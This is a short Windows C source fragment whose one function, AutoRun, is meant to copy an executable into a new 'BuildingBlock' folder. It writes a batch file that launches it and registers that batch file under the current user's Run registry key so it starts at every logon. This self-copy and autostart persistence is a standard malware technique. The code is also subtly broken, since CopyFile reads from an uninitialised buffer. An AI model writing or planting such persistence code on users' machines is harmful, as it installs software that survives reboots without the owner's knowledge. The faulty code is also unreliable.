//-----2-----

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
void AutoRun();
void AutoRun()
{
    char path[MAX_PATH];
    char command[2 * MAX_PATH];
    char folderName[] = "BuildingBlock";
    GetModuleFileName(NULL, path, MAX_PATH);
    char *last = strrchr(path, '\\');
    *last = '\0';
    strcat(path, "\\");
    strcat(path, folderName);
    CreateDirectory(path, NULL);
    strcat(path, "\\");
    strcat(path, folderName);
    strcat(path, ".exe");
    CopyFile(command, path, FALSE);
    last = strrchr(path, '\\');
    *last = '\0';
    strcat(path, "\\");
    strcat(path, folderName);
    strcat(path, ".bat");
    FILE *fp = fopen(path, "w");
    fprintf(fp, "@echo off\n");
    fprintf(fp, "start %s.exe\n", folderName);
    fprintf(fp, "exit\n");
    fclose(fp);
    last = strrchr(path, '\\');
    *last = '\0';
    strcat(path, "\\");
    strcat(path, folderName);
    strcat(path, ".bat");
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, folderName, 0, REG_SZ, (BYTE *)path, strlen(path));
    RegCloseKey(hKey);
}